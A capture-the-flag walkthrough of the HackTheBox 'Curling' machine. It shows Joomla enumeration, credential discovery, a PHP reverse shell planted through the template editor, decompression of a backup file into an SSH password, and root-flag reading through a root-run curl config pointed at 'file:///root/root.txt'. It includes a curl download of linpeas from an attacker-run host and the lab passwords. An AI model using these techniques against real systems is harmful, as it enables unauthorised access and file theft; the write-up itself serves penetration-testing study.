Begin with binding the machine IP to a custom domain.

![[HackTheBox/Curling/images/1.png]]

Conduct port scanning with `sudo nmap -sV -sC curling.htb`.

![[HackTheBox/Curling/images/2.png]]

Let's check `Joomla`:

![[HackTheBox/Curling/images/3.png]]

There was nothing valuable on this page. I also conducted a port scan with the `--script=vuln` NSE engine.

`sudo nmap -sV --script=vuln --max-rate=10000 curling.htb`

It reveals some potentially interesting directories and the version number of `Joomla`, which is 3.8.8.

![[HackTheBox/Curling/images/4.png]]

I iterated multiple fuzzing attempts, yet no juicy information was available except the `administrator` endpoint. Here are the tools and commands I ran so far:

```bash
gobuster dir -u http://curling.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt

gobuster dir -u http://curling.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files.txt

gobuster dir -u http://curling.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-files.txt

gobuster dir -u http://curling.htb -w /usr/share/wordlists/dirb/big.txt

gobuster dir -u http://curling.htb -w /usr/share/wordlists/dirb/common.txt

gobuster dir -u http://curling.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Furthermore, I also applied the `-r` parameter to fuzz more deeply. After a couple of minutes of source code analysis, I decided to search for patterns like `password` and `hint`. However, I still did not find anything. After analyzing patiently, I found that the last line of the source code includes `secret.txt` as a hint.

![[HackTheBox/Curling/images/5.png]]


`Q3VybGluZzIwMTgh` - a text file that includes something that looks like a password. I then pushed this to `CyberChef`:

![[HackTheBox/Curling/images/6.png]]

This looks like a password: `Curling2018!`, but what about the username?

One of the posts mentions curling and 2018 strings, and I noticed `Floris` at the end of the thread message.

![[HackTheBox/Curling/images/7.png]]

I tried `Floris:Curling2018!` and logged in as `Super User` according to the right side of the page.

![[HackTheBox/Curling/images/8.png]]

Since I was able to sign in on the frontend, what about using the admin login page?

It works!

![[HackTheBox/Curling/images/9.png]]

Initially, it would be appropriate to use a GitHub exploit since it is a more accessible and direct solution. Plus, it requires an authenticated user, so let's move on.

![[HackTheBox/Curling/images/10.png]]

Direct execution was not possible. Therefore, the best approach is to create a virtual environment via `python -m venv venv` and then install the requirements line by line.

```bash
pip install requests
pip install lxml
pip install log_colors
```

Now the usage is easy, just follow the guideline:

![[HackTheBox/Curling/images/11.png]]

The script gets stuck, so I manually reached the endpoint where the shell payload was executed.

`/administrator/index.php?option=com_templates&view=template&id=503&file=L2pzc3RyaW5ncy5waHA=`

![[HackTheBox/Curling/images/12.png]]

A generic `PentestMonkey` shell works since the application is running on `PHP` on the backend side, but this time I will use reverse shell generator's payload.

Start the listener:

```bash
penelope -p 1234
```

I used Ivan Sincek's payload.

Save and execute the PHP script through the `template preview` option, which runs the server-side script.

![[HackTheBox/Curling/images/13.png]]

You need to get the `floris` account to obtain the user flag. I discovered a file called `password_backup` that contains some weird content.

![[HackTheBox/Curling/images/14.png]]

I searched for `BZh91AY` and identified this pattern in an OverTheWire challenge.

[Challenge](https://david-varghese.medium.com/overthewire-bandit-level-12-level-13-2ec761a88907)

Let's use:

```bash
xxd -r data > binary
ls  binary  data
```

The target machine has the `/usr/bin/xxd` binary.

I got a permission error while working in the `floris` user's home directory, so I moved to the `/tmp` directory.

![[HackTheBox/Curling/images/15.png]]

The challenge suggested identifying the file type:

![[HackTheBox/Curling/images/16.png]]

```bash
bunzip2 binary or bzip2 -d binary
```

We have to go further:

![[HackTheBox/Curling/images/17.png]]

Now I was dealing with `gzip` format.

![[HackTheBox/Curling/images/18.png]]

```bash
mv binary.out binary.gz
gunzip binary.gz
```

![[HackTheBox/Curling/images/19.png]]


```bash
mv binary binary2.bz2
bunzip2 binary2.bz2 or bzip2 -d binary2.bz2
```

![[HackTheBox/Curling/images/20.png]]

```bash
tar -xf binary2
cat password.txt
5d<wdCbdZu)|hChXll
```

Now this is most probably the password for SSH as floris.

Gotcha!!!

![[HackTheBox/Curling/images/21.png]]

Now that we have SSH access as floris, we can read the user flag:

![[HackTheBox/Curling/images/28.png]]

I checked for a local privilege escalation vector via `sudo -l`.

![[HackTheBox/Curling/images/22.png]]

It did not work.

I did not find anything valuable in the `admin-area` directory, so let's start linpeas.

`curl http://10.10.15.57:1212/linpeas.sh -o linpeas.sh`

It was not useful.

However, the `admin-area` directory includes interesting file formats pointing to the root path.

![[HackTheBox/Curling/images/23.png]]

It points to localhost, and the `report` file includes the parsed page.

![[HackTheBox/Curling/images/24.png]]

Let's check to parse the page via `curl`:

![[HackTheBox/Curling/images/25.png]]

Observe that the parsing results point to the same pages.

I began to find a way to point to the target machine's files in order to read the root flag.

I found a bug bounty report that includes the usage for these types of purposes:

[Report](https://hackerone.com/reports/3242087)

Let's try:

![[HackTheBox/Curling/images/26.png]]

Alter the content of the `input` file as below:

`url = "file:///root/root.txt"`

Then read the root flag from `cat report`:

![[HackTheBox/Curling/images/27.png]]